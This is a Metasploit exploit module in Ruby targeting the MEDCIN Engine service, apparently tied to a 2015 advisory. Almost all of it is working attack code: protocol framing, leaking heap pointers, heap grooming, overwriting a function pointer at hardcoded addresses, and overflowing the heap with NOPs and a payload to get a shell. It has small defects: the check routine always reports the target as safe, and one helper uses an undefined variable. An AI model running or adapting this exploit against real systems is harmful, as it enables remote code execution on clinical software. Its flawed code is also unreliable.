##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'MEDCIN Engine Memory Disclosure/Arbitrary Write/Heap Buffer Overflow',
      'Description'	=> %q{
          This module exploits three separate vulnerabilities. The first vulnerability allows an	
          attacker to leak back all of the data in the process's data section. The second vulnerability
          allows the overwrite of a function pointer in the data section to somewhere controlled in the 
          heap. The last vulnerability allows for the overflow of the heap into the allocation pointed
          to by the overwritten function pointer. 
      },
      'Author' 	=> [ 'b0yd' ],
      'Arch'		=> [ ARCH_X86 ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'CVE', '2015-2900,2901,6006'],
          [ 'OSVDB', ''],
          [ 'BID', '77127'],
          [ 'URL', 'https://www.securifera.com/advisories/cve-2015-2898-2901/'],
        ],
      'Privileged'		=> false,
      'DefaultOptions'	=>
        {
          'EXITFUNC' 	=> 'process',
        },
      'Payload'        	=>
        {
          'Space'		=> 1000,
          'BadChars'		=> "\x00\x0a",
        },
      'Platform' => ['win'],
       'Targets'        =>
        [
          [
            'MEDCIN < 2.22.20153.226',
            {
            }
          ],
        ],
      'DisclosureDate' => 'Oct 20 2015',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(8080),
      ], self.class)
  end

  def check
    connect
    print_status("Attempting to determine if target is possibly vulnerable...")
    select(nil,nil,nil,7)

    return Exploit::CheckCode::Safe
  end
  
  def send_receive(type, pack_len, data)

    ret_len = 0
    if pack_len < 6 or pack_len > 0x3d090
      print "Length(Arg 2) must be between 6 and 0x3d090 bytes."
      return
    end

    #Set the type
    buf = [type].pack('S>')
  
    #Send length, must be less than 0x3d090, can be negative
    buf += [pack_len].pack('I>')

    #Send header
    sock.put(buf)

    #Send data
    if pack_len > 0
      #Send data
      sock.put(data)
    end

    ret_data = ''
    loop do
      temp = sock.get_once(-1,0.5)
      break if temp == nil
      ret_data += temp
    end

    return ret_data	
  end
  
  def free_alloc_ptrs( ptr_offset )

    #Free buffers
    free_number = ptr_offset

    #Free buffers
    i = 265

    #send a packet to zero out the target address
    data = [free_number].pack('I>')
    data += "\x00"

    ret_len = send_receive( i, data.length + 6, data )	
  end
  
  def trigger_heap_overflow( len_str )

    #Data overflow type
    i = 27

    #send a packet and try to receive results
    data = ''
    if len_str > 0
      data += "\x90" * len_str
      data += sc
    end
    
    data += "\x00"
    ret_len = send_receive( i, data.length + 6, data )
    
  end
  
  def leak_mem( starting_size, overwrite_byte, max_len )

    j = starting_size
    k = 7

    ret_data = ''
    while true

      #Data overflow type
      i = 256

      #send a packet and try to receive results
      data = ''
      data += "\x00"
      data += overwrite_byte * j
      data += "\x00"

      #send and receive
      ret_data = send_receive( i, data.length + 6, data )
      ret_buf_len = ret_data.length
      diff = max_len - ret_buf_len

      #print_status("Received Bytes: " + ret_buf_len.to_s(16))
      if ret_buf_len > max_len
	break
      elsif diff < 0x26
	j = 65
      elsif diff < 0x100
	j = 72
      else
	j = (diff / 2) + 64
      end
      
      sleep(0.2)
    end
    
    return ret_data
  end
  
  def groom_heap( size )

    #Data overflow type
    i = 84

    #send a packet and try to receive results
    data = ''
    #data += offset
    prng = Random.new
    offset = prng.rand(2000000000) 
    #offset = random.randint(1, 2000000000)
    data += [offset].pack('I>')
    data += "A"* size
    data += "\x00"

    ret_len = send_receive( i, data.length + 6, data )
    sleep(0.2)
    
  end
  
  def alloc_free_single( index, alloc_flag, size )

    if index < 0 or index > 100
      print_error("Please give an index > 0 and < 100.")
      return
    end

    #Try things
    i = 122

    data = [index].pack('S>')
    if alloc_flag
      data += "A"* size
    end
		#print "[+] Allocated buffer for index " + str(index)
	#else:
		#print "[+] Freed buffer at index " + str(index)
		
    data += "\x00"
	
    send_receive( i, data.length + 6, data)
  end

  def exploit
    print_status("Trying target #{target.name} on host #{datastore['RHOST']}:#{datastore['RPORT']}...")
    connect
    print_status("Connected to MEDCIN Service.")
    print_status("Reallocating initial heap buffers for exploit.")
    
    #Free buffers
    free_number = 0xFF439EB2
    free_alloc_ptrs( free_number )
    
    #Alloc buffers
    alloc_number = 0xf5000
    free_alloc_ptrs( alloc_number )
    
    # Release heap address
    print_status("Freeing heap buffer for heap overflow.")
    trigger_heap_overflow(0)
    
    print_status("Overflowing data section to leak heap pointers.")
    #Send initial packet, crashes sometimes without it
    #Data overflow type
    i = 256

    #send a packet and try to receive results
    data = ''
    data += "\x00"
    data += "\x01" * 64
    data += "\x00"
    
    ret_data = send_receive( i, data.length + 6, data )
        
    # offset to addr + header
    offset_to_addr = 0x65e0 + 6
    offset_to_addr2 = 0x3aa8 + 6

    # Fill the data section with 0x1s
    ret_data = leak_mem( 0x3a00, "\x01", offset_to_addr )
  
    # Get the data so we can parse it
    ret_data = leak_mem( 65, "\x04", offset_to_addr + 2 )
    #ret_buf_len = ret_data.length

    #print out
    off_addr_arr = ret_data[offset_to_addr, 4]
    off_addr_arr2 = ret_data[offset_to_addr2, 4]
    
    if off_addr_arr.length == 4 
      off_addr = off_addr_arr.unpack("I")[0]
    else
      off_addr = 0x0
    end
    
    #print_status("Arb write address: " + off_addr.to_s(16))
    
    off_addr2 = off_addr_arr2.unpack("I")[0]
    #print_status("Dependent address: " + off_addr2.to_s(16))
    
    # Activate low frag heap
    print_status("Activating Low Fragmentaion Heap for second size and skipping first bucket.")
    for i in 0..0x70
      groom_heap( 0xff )
    end
    
    #Reserve spot for later
    alloc_free_single( 12, true, 0xff )	
    alloc_free_single( 13, true, 0xff )	

    for i in 0..0x30
      groom_heap( 0xff )
    end
    
    #Free one
    alloc_free_single( 13, false, 0xff )
    
    # Func Ptr
    func_ptr_addr = 0x04E9128
    offset = (func_ptr_addr - off_addr)/4

    # Arbitrary write
    print_status("Overwriting function pointer with heap pointer.")
    i = 70
    offset2 = 0xf5000

    #send a packet and try to receive results
    data = ''
    data += [offset].pack('I>')
    data += [offset2].pack('I>')
    data += "\x01" * 0xffa9
    data += "\x00"*16

    ret_len = send_receive( i, data.length + 6, data )
    sleep( 2 )

    #Reserve spot for later
    alloc_free_single( 12, false, 0xff )	
    
    # Arbitrary write
    print_status("Overflowing heap allocation with shellcode.")

    func_ptr_addr = 0x04E9348
    offset = (func_ptr_addr - off_addr)/4
    i = 70
    offset2 = 0xf5000

    #send a packet and try to receive results
    data = ''
    data += [offset].pack('I>')
    data += [offset2].pack('I>')

    buf = make_nops( 1200 )
    buf << payload.encoded
    
    data += buf
    data += "\x01" * ( 0xffa9 - buf.length )
    data += "\x00"*16

    ret_len = send_receive( i, data.length + 6, data )
    sleep( 2 )

    # Call function pointer
    print_status("Calling overwritten function pointer.")
    i = 12

    index = 100
    data = [index].pack('I>')
    send_receive( i, data.length + 6, data)
    
    #Handle the shell
    handler
    disconnect
  end

end
